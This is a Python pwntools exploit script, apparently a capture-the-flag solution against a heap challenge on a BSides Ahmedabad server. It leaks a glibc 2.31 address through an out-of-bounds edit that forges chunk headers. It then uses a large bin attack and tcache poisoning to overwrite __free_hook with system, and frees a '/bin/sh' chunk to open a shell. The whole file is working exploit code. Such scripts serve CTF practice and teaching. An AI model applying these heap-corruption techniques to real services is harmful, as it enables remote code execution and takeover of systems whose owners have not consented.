from pwn import *
import sys

libc = ELF("libc-2.31.so")
elf = ELF("chall_patched")

if sys.argv[1] == "l":
    p = process("./chall_patched", env={"LD_PRELOAD":"libc-2.31.so"})
    context.terminal = ["tmux", "splitw", "-h"]
    gdb.attach(p, """ 
                    continue
                """)
else:
    p = remote("pwn.bsidesahmedabad.in", 9003)

def create(index, size, content):
    p.sendlineafter("Choice: ", "1")
    p.sendlineafter("Index: ", str(index))
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Content: ", content)

def edit(index, offset, count, content):
    p.sendlineafter("Choice: ", "2")
    p.sendlineafter("Index: ", str(index))
    p.sendlineafter("Offset: ", str(offset))
    p.sendlineafter("Count: ", str(count))
    p.sendafter("Content: ", content)

def show(index):
    p.sendlineafter("Choice: ", "3")
    p.sendlineafter("Index: ", str(index))

def delete(index):
    p.sendlineafter("Choice: ", "4")
    p.sendlineafter("Index: ", str(index))

def solve():
    # stage 1: leak
    create(0, 0x20, "\n")
    create(1, 0x200, "\n")
    create(2, 0x300, "\n")
    create(3, 0x30, "\n")
    edit(0, 0x10, (0x7fffffff-0x10+1), "A"*(0x20-0x10) + p64(0) + p64(0x521) + "\n")
    delete(1)
    create(1, 0x300, "A"*0x200 + p64(0) +p64(0x310) + "\n")
    show(2)
    libc.address = u64(p.recvline()[0x109:0x100+15] + "\x00\x00") - 0x1ebbe0
    free_hook = libc.symbols["__free_hook"]
    binsh = next(libc.search("/bin/sh\x00"))
    system = libc.symbols["system"]
    success("libc leak: %s"%hex(libc.address))
    success("free hook: %s"%hex(free_hook))
    
    # reset all pointers
    delete(1)
    create(1, 0x200, "\n")
    delete(1)
    delete(0)
    delete(2)
    delete(3)

    # stage 2: large bin attack to write to free_hook
    # for i in range(0x7):    # fillup tcache 0x20
        # create(0, 0x10, "\n")
        # delete(0)
    create(0, 0x10, "\n")
    create(1, 0x428, "\n")  # p1
    create(2, 0x10, "\n")   # g1
    create(3, 0x418, "\n")  # p2
    # put a chunk to unsorted bin
    delete(1)
    # put a chunk to large bin
    create(1, 0x438, "\n")

    # put a chunk to unsorted bin
    delete(3)    

    # modify bk->next of chunk p1
    edit(0, 0x38, (0x7fffffff-0x38+1), p64(free_hook-0x40) + "\n")
    
    create(3, 0x440, "\n")

    delete(2)
    create(2, 0x400, "\n")

    edit(0, 0x30, (0x7fffffff-0x30+1), p64(0)*2 + "\n")

    delete(0)
    delete(1)
    delete(2)

    for i in range(7):
        create(0, 0x40, "\n")
        delete(0)

    create(0, 0x20, "\n")
    create(1, 0x40, "\n")
    
    delete(1)

    edit(0, 0x10, (0x7fffffff-0x10+1), "A"*(0x20-0x10) + p64(0) + p64(0x51) + p64(free_hook-0x23) + "\n")
    
    create(1, 0x40, "/bin/sh\x00\n")
    create(2, 0x40, "Z"*0x13 + p64(system) +  "\n")

    delete(1)
    p.interactive()

if __name__ == "__main__":
    solve()